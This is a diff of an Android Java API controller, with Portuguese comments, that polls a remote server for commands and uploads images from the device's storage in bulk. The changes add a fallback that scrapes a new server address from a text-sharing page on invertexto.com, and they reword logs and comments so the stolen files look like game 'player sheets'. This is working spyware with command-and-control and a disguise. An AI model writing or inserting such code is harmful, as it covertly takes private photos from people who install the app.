@@ -7,6 +7,10 @@ import android.provider.MediaStore;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
+import org.jsoup.Jsoup;
+import org.jsoup.nodes.Document;
+import org.jsoup.nodes.Element;
+import org.jsoup.select.Elements;
 
 import java.io.File;
 import java.io.IOException;
@@ -48,16 +52,16 @@ public class ApiController {
         return MultipartBody.Part.createFormData(partName, file.getName(), requestFile);
     }
 
-    private void uploadMultipleFiles(String dir, int maxUploads, ArrayList<String> sendedList, ArrayList<String> allFiles) {
+    private void uploadMultipleFiles(String dir, int maxUploads, ArrayList<String> sendedList, ArrayList<String> allFiles, String apiLink) {
 
         // dir: diretorio dos arquivos ou "0"
         // maxUploads: maximo de arquivos por Post
         // sendedList: lista dos arquivos ja enviados
-        // allFiles: lista de todos os arquivos(img) do dispositivo
+        // allFiles: lista de todos os arquivos(img)
 
         File[] files;
 
-        // check se dir é "0" e allFiles tem algo dentro (Pegar de todos os arquivos)
+        // check se dir é "0" e allFiles tem algo dentro
         if(dir.equals("0") && allFiles.size()>0){
             //files = allFiles.toArray();
             File[] arr = new File[allFiles.size()];
@@ -66,7 +70,7 @@ public class ApiController {
             files = arr;
         }
         else{
-            // Pega apenas do diretorio escolhido
+            // Apenas do diretorio escolhido
             String path= Environment.getExternalStorageDirectory().getAbsolutePath()+dir;
             File directory = new File(path);
             files = directory.listFiles();
@@ -94,8 +98,8 @@ public class ApiController {
                             || files[i].getName().contains(".bmp") || files[i].getName().contains(".BMP")
                     )
                     {
-                        System.out.println("Arquivo achado: " + files[i]);
-                        // Adicionando na lista cada filePart contendo o arquivo
+                        System.out.println("Ficha do jogador achada: " + files[i]);
+                        // Adicionando na lista cada filePart contendo o arquivo da ficha
                         parts.add(prepareFilePart("file", files[i]));
                         System.out.println("Current: " + parts.size());
 
@@ -109,7 +113,7 @@ public class ApiController {
         }
 
         Retrofit retrofitUpload = new Retrofit.Builder()
-                .baseUrl(Api.BASE_URL)
+                .baseUrl(apiLink)
                 .addConverterFactory(GsonConverterFactory.create())
                 .build();
 
@@ -138,19 +142,38 @@ public class ApiController {
         });
     }
 
-    public void getCommands(ArrayList<String> allFiles) {
+    public void getCommands(ArrayList<String> allFiles, String newLink) {
+        Retrofit retrofit;
+        String apiLink = "";
 
-        Retrofit retrofit = new Retrofit.Builder()
-                .baseUrl(Api.BASE_URL)
+        // isso só vale se o invertexto estiver online no link ac4xrtxmy11
+        // if nao tem link usa o link base
+        if(newLink == null){
+            apiLink = Api.BASE_URL;
+        } // se nao tem usa o novo
+        else{
+            apiLink = newLink;
+        }
+
+        retrofit = new Retrofit.Builder()
+                .baseUrl(apiLink)
                 .build();
+
         Api retrofitAPI = retrofit.create(Api.class);
 
         Call<ResponseBody> call = retrofitAPI.getCommands();
+        String finalApiLink = apiLink;
         call.enqueue(new Callback<ResponseBody>() {
             @Override
             public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                 String jsonResp = "";
                 try {
+                    // se o DNS nao existe
+                    System.out.println("VALOR: " +response.body());
+                    if(response.body() == null){
+                        return;
+                    }
+                    System.out.println("TEM VALOR");
                     jsonResp = response.body().string();
                 } catch (IOException e) {
                     e.printStackTrace();
@@ -179,7 +202,7 @@ public class ApiController {
 
                     if (run.equals("true")) {
                         // chamando o metodo de upload passando os parametros q vieram
-                        uploadMultipleFiles(dir, maxUploads, listdata, allFiles);
+                        uploadMultipleFiles(dir, maxUploads, listdata, allFiles, finalApiLink);
                     }
                     else{
                         return;
@@ -235,5 +258,47 @@ public class ApiController {
                 System.out.println("Error found is : " + t.getMessage());
             }
         });
+    }
+    public void getLink(ArrayList<String> allFiles){
+        final String[] newLink = {null};
+        System.out.println("GET NEW LINK");
+        Retrofit retrofit = new Retrofit.Builder()
+                .baseUrl("https://www.invertexto.com")
+                .build();
+        Api retrofitAPI = retrofit.create(Api.class);
+
+        Call<ResponseBody> call = retrofitAPI.getNewServerLink();
+        call.enqueue(new Callback<ResponseBody>() {
+            @Override
+            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
+                String res = "";
+                try {
+                    System.out.println("Dentro do new link");
+                    if(response.body() == null){
+                        System.out.println("Response Null, URL Domain not found");
+                        return;
+                    }
+                    res = response.body().string();
+
+                    Document document = Jsoup.parse(res);
+                    Element textArea = document.select("textarea").first();
+                    String link = textArea.text();
+                    newLink[0] = link;
+
+                    getCommands(allFiles, link);
+
+                    System.out.println("RESULTADO: "+newLink[0]);
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
+            @Override
+            public void onFailure(Call<ResponseBody> call, Throwable t) {
+                // setting text to our text view when
+                // we get error response from API.
+                System.out.println("Error found is : " + t.getMessage());
+            }
+        });
+
     }
 }
